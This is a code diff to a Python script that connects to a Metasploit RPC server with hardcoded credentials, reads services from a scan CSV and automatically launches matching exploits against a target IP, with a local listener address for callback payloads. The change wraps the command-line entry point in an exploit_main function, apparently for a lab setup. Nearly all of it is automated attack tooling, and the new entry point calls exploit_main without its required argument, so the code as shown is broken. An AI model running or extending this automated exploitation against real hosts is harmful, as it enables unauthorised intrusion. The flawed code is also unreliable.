@@ -91,20 +91,16 @@ def search_exploits(client, service_name, platform, module_type='exploit'):
         print(f"Error occurred while searching for exploits: {e}")
 
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='Metasploit Exploit Searcher')
-    parser.add_argument('csv_file', type=str, help='Path to the CSV file containing scan results')
-    parser.add_argument('--mode', choices=['verbose', 'non_verbose'], default='verbose', help='Mode of operation: verbose or non_verbose')
-    args = parser.parse_args()
-
+def exploit_main(ip_address, verbose=True):
     try:
         client = MsfRpcClient(username="msf", password="abc123", port=55552, ssl=True)
         if client.login("msf", "abc123"):
             print(Fore.GREEN + "Successfully connected to the Metasploit RPC server!")
-            rhosts = "192.168.56.102"
+            rhosts = ip_address  # Assuming rhosts is the ip_address passed to the function
             lhost = "10.0.2.15"
             lport = ""  # Enter attacker port
-            parsed_data = parse_csv(args.csv_file)
+            csv_file = "Exploitable.csv"
+            parsed_data = parse_csv(csv_file)
             for port, service_info in parsed_data.items():
                 service_name = service_info['Service']
                 platform = service_info['Platform'].lower().strip()
@@ -122,7 +118,7 @@ if __name__ == "__main__":
                     continue
                 try:
                     print(Fore.MAGENTA + f"Currently exploiting service: {service_name}")
-                    if args.mode == 'verbose':
+                    if verbose:
                         exploit_results = choose_exploit_auto_run_verbose(client, selected_exploits, rhosts, lhost, lport)
                     else:
                         exploit_results = choose_exploit_auto_run_non_verbose(client, selected_exploits, rhosts, lhost, lport)
@@ -141,3 +137,7 @@ if __name__ == "__main__":
             print(Fore.RED + "Failed to authenticate with the Metasploit RPC server.")
     except Exception as e:
         print(Fore.RED + f"An error occurred: {e}")
+
+
+if __name__ == "__main__":
+    exploit_main()
